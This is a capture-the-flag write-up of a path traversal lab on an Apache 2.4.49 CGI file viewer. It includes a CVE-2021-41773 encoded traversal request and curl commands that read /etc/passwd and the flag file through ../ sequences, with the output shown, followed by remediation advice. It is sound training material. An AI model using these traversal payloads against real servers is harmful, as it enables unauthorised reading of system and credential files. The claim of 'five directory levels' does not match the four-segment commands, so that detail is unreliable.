---
layout: post
title: "Path Traversal - Apache 2.4.49 CVE-2021-41773 & LFI in CGI File Viewer"
description: "CTF writeup exploiting path traversal in an Apache 2.4.49 CGI file viewer to read flag.txt outside the web root via dot-dot-slash traversal."
category: hackerdna
tags: [web, ctf, hackerdna, path-traversal, lfi, cve-2021-41773, apache, cgi, file-read]
---

## Path Traversal - CTF Writeup

**Category:** WEB | **Flags:** 1

Challenge: [https://hackerdna.com/labs/path-traversal](https://hackerdna.com/labs/path-traversal)

## Contents

- [Reconnaissance](#reconnaissance)
- [Local File Read](#local-file-read)
- [Flag](#flag)

## Reconnaissance

Nmap reveals one open port:

- **80** - Apache 2.4.49 (Unix) - "File Server" challenge

The page advertises a vulnerable file server based on Apache **2.4.49** - the version
famously vulnerable to **CVE-2021-41773** (path traversal and arbitrary file read via
`..%2f` encoding in the `cgi-bin` Alias). Two endpoints are present:

- `/vulnerable.cgi` - a CGI "File Viewer" taking a `?file=` parameter
- `/test.cgi` - placeholder script

The direct CVE-2021-41773 request (`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`) returns
`403 Forbidden` - the traversal is filtered at the Apache layer. The real entry point
is the CGI script's own `?file=` parameter.

## Local File Read

`vulnerable.cgi` reads a filename supplied via `?file=` and serves it back, resolving
the path relative to `/usr/local/apache2/htdocs/`. It does no traversal filtering.

A plain `../../etc/passwd` is not enough to escape the htdocs root - the path must
climb five directory levels up to reach the filesystem root:

```bash
curl "http://TARGET/vulnerable.cgi?file=../../../../etc/passwd"
```

The response returns the file contents in a `<pre>` block:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Enumerating for the flag file:

```bash
curl "http://TARGET/vulnerable.cgi?file=../../../../flag.txt"
```

```
7a9b8c1d-2e3f-4a5b-6c7d-8e9f0a1b2c3d
```

**Flag:** `7a9b8c1d-2e3f-4a5b-6c7d-8e9f0a1b2c3d`

## How the Attack Works

The CGI script prepends a trusted base directory to the user-controlled filename and
passes the result to the filesystem:

```c
path = "/usr/local/apache2/htdocs/" + file_parameter
```

With `file=../../../../flag.txt` the OS path resolution collapses the traversal
segments instead of the application, yielding `/flag.txt` on the real filesystem.
Because the developer "trusted" the prefix, the `..` segments are never validated,
turning an intended file viewer into a read-any-file primitive. The challenge
deliberately pairs this with Apache 2.4.49 to echo the real-world CVE-2021-41773
class of vulnerability.

## Key Takeaways

- **Path traversal happens at the application layer.** Filtering `../` at the web
  server level (mod_security-style rules) is a mitigation, not the fix - validate and
  canonicalise paths in the app before touching the filesystem.
- **Canonicalise before comparing.** Resolve the target path and check it stays under
  the intended directory (e.g. `realpath` + prefix check) before opening any file.
- **Never accept filenames from users for arbitrary reads.** A directory whitelist or
  opaque file IDs (database keys) removes the primitive entirely.
- **Check for path traversal in every parameter** - `?file=`, `?page=`, `?template=`,
  `?lang=` and downloads are the classic spots.